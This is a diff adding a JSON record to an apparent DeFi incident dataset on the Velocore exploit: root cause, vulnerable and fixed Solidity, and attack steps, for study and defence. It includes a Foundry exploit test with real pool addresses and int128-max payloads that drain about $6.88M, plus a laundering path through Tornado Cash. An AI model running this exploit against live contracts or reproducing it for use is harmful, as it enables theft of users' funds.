@@ -1,0 +1,47 @@
+{
+ "id": "2024__2024-06-02_Velocore_InvariantFlaw_zkSync",
+ "source_file": "2024/2024-06-02_Velocore_InvariantFlaw_zkSync.md",
+ "title": "Velocore — Invariant Check Flaw Analysis",
+ "date": "2024-06-02",
+ "protocol": "Velocore",
+ "chain": "Linea",
+ "loss_raw": "$6,880,000 (~700+ ETH)",
+ "loss_usd": 6880000.0,
+ "root_cause": "Missing caller validation in AMM pool's `velocore__execute()` + arithmetic underflow caused by allowing `effectiveFee1e9` to exceed 100%",
+ "attack_tx": null,
+ "vulnerable_contract": "0xe2c6...5DB (USDC-ETH VLP Pool)",
+ "classes": [
+  "slippage-amm"
+ ],
+ "code_before": [
+  "// ❌ Vulnerable code: no caller validation in velocore__execute()\nfunction velocore__execute(\n    address caller,        // ← receives caller parameter but never validates it\n    bytes32[] calldata tokens,\n    int128[] memory r,\n    bytes calldata data\n) external returns (int128[] memory, int128[] memory) {\n    // ❌ Anyone can call this function directly\n    // ❌ No check whether msg.sender is the Vault contract\n    _updateFeeMultiplier(r);  // feeMultiplier can be manipulated\n    // ...\n}",
+  "// ❌ Vulnerable code: effectiveFee1e9 can exceed 1e9 (100%)\nfunction _calculateEffectiveFee(uint256 feeMultiplier) internal view returns (uint256) {\n    // No upper bound on feeMultiplier, allowing it to exceed 1e9\n    uint256 effectiveFee1e9 = baseFee1e9 * feeMultiplier;\n    return effectiveFee1e9; // ❌ No check for exceeding 100%\n}\n\nfunction _applyFee(uint256 k, uint256 effectiveFee1e9) internal pure returns (uint256) {\n    // ❌ Underflow occurs when effectiveFee1e9 > 1e9\n    // When (1e18 - k) * effectiveFee1e9 / 1e9 > 1e18, result underflows\n    return 1e18 - ((1e18 - k) * effectiveFee1e9) / 1e9;\n    //     ^^^^^   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n    //     When this value is less than the right-hand side: uint256 underflow → wraps to max value\n}",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\n// @KeyInfo - Total Lost : $6.88M\n// Attack Tx : https://lineascan.build/tx/0xed11d5b013bf3296b1507da38b7bcb97845dd037d33d3d1b0c5e763889cdbed1\n// Attacker  : 0x8cdc37ed79c5ef116b9dc2a53cb86acaca3716bf\n// Attack Contract : 0xb7f6354b2cfd3018b3261fbc63248a56a24ae91a\n\ncontract ContractTest is Test {\n    address USDC_ETH_VLP = 0xe2c67A9B15e9E7FF8A9Cb0dFb8feE5609923E5DB; // Vulnerable CPMM pool\n    address swapfacet = 0x1d0188c4B276A09366D05d6Be06aF61a73bC7535;     // Vault SwapFacet\n\n    function testExploit() public {\n        // [Step 1] Manipulate feeMultiplier: call velocore__execute() directly 3 times\n        // ❌ No caller validation — executable externally without restriction\n        bytes32[] memory tokens = new bytes32[](2);\n        tokens[0] = USDC_e_bytes32;\n        tokens[1] = USDC_ETH_VLP_bytes32;\n\n        int128[] memory amounts = new int128[](2);\n        amounts[0] = 170_141_183_460_469_231_731_687_303_715_884_105_727; // int128 max value\n        amounts[1] = 8_616_292_632_827_688;\n\n        // 3 repeated calls to push effectiveFee1e9 > 100%\n        ConstantProductPool(USDC_ETH_VLP).velocore__execute(address(this), tokens, amounts, hex\"\");\n        ConstantProductPool(USDC_ETH_VLP).velocore__execute(address(this), tokens, amounts, hex\"\");\n        ConstantProductPool(USDC_ETH_VLP).velocore__execute(address(this), tokens, amounts, hex\"\");\n\n        // [Step 2] Exploit underflow state via 4 consecutive swap executions\n        // Lowest 16 bytes of tokenInformations = int128-encoded amount\n        // 0x7fff...ffff = int128 MAX → \"extract as much as possible regardless of balance\"\n        VelocoreOperation[] memory ops = new VelocoreOperation[](4);\n\n        // ops[0~2]: Progressively manipulate pool state (attempt USDC.e withdrawal)\n        ops[0].tokenInformations[0] = 0x00...ffffffffffffffffffffff787406ca5f; // Small VLP withdrawal\n        ops[0].tokenInformations[1] = 0x01...7fffffffffffffffffffffffffffffff; // ETH MAX\n        ops[0].tokenInformations[2] = 0x02...7fffffffffffffffffffffffffffffff; // VLP MAX\n\n        // ops[3]: Final large USDC.e extraction\n        ops[3].tokenInformations[0] = 0x00...ffffffffffffffffffffffffffffd8f0; // USDC.e withdrawal\n        ops[3].tokenInformations[1] = 0x02...7fffffffffffffffffffffffffffffff; // VLP MAX\n\n        // ❌ Call SwapFacet in underflow state → massive USDC.e profit\n        SwapFacet(swapfacet).execute(tokenRef, deposit, ops);\n\n        // [Step 3] Verify profit\n        uint256 profit = IERC20(USDC_e).balanceOf(address(this));\n        console.log(\"USDC_e profit after attack: $\", profit / 10 ** 6);\n        // Output: USDC_e profit after attack: $ 6,880,000 (approx)\n    }\n}"
+ ],
+ "code_after": [
+  "// ✅ Fixed code: Vault address validation added\naddress immutable vault;\n\nfunction velocore__execute(\n    address caller,\n    bytes32[] calldata tokens,\n    int128[] memory r,\n    bytes calldata data\n) external returns (int128[] memory, int128[] memory) {\n    // ✅ Restricted so only the Vault contract can call\n    require(msg.sender == vault, \"VelocorePool: caller must be Vault\");\n    _updateFeeMultiplier(r);\n    // ...\n}",
+  "// ✅ Fixed code: upper bound set for effectiveFee1e9\nuint256 constant MAX_FEE_1E9 = 1e9; // 100% cap\n\nfunction _calculateEffectiveFee(uint256 feeMultiplier) internal view returns (uint256) {\n    uint256 effectiveFee1e9 = baseFee1e9 * feeMultiplier;\n    // ✅ Prevent exceeding 100%\n    if (effectiveFee1e9 > MAX_FEE_1E9) {\n        effectiveFee1e9 = MAX_FEE_1E9;\n    }\n    return effectiveFee1e9;\n}\n\nfunction _applyFee(uint256 k, uint256 effectiveFee1e9) internal pure returns (uint256) {\n    // ✅ Underflow impossible since effectiveFee1e9 <= 1e9 is guaranteed\n    require(effectiveFee1e9 <= MAX_FEE_1E9, \"Fee exceeds 100%\");\n    return 1e18 - ((1e18 - k) * effectiveFee1e9) / 1e9;\n}"
+ ],
+ "steps": [
+  "Attacker → ConstantProductPool.velocore__execute() direct call (×3)",
+  "→ _feeMultiplier spikes dramatically",
+  "→ effectiveFee1e9 > 1e9 (exceeds 100%)",
+  "Attacker → Vault.SwapFacet.execute() called 4 times consecutively",
+  "- Small USDC.e input → massive VLP minted due to underflow state",
+  "Attacker → Secures large USDC.e profit",
+  "Attacker → Converts to ETH and bridges to Ethereum mainnet",
+  "Attacker → Deposits into Tornado Cash (~1,700 ETH)",
+  "→ feeMultiplier spikes effectiveFee1e9 > 100%",
+  "→ effectiveFee > 100% ◄ Underflow triggered",
+  "Result: → Massive VLP minted",
+  "→ VLP burned → Large USDC.e",
+  "Large USDC.e secured → Converted to ETH",
+  "→ Bridged to Ethereum mainnet",
+  "→ Laundered via Tornado Cash (~1,700 ETH, ~$6.88M)",
+  "→ 0xe4062fcade7ac0ed47ad794028967a2314ee02b3"
+ ],
+ "other_code": [
+  "result = 1e18 - ((1e18 - k) * effectiveFee1e9) / 1e9",
+  "Attacker → ConstantProductPool.velocore__execute() direct call (×3)\n  - tokens: [USDC.e, VLP]\n  - amounts[0] = int128 max value (170,141,183,460,469,231,731,687,303,715,884,105,727)\n  - amounts[1] = 8,616,292,632,827,688\n  → _feeMultiplier spikes dramatically\n  → effectiveFee1e9 > 1e9 (exceeds 100%)"
+ ]
+}
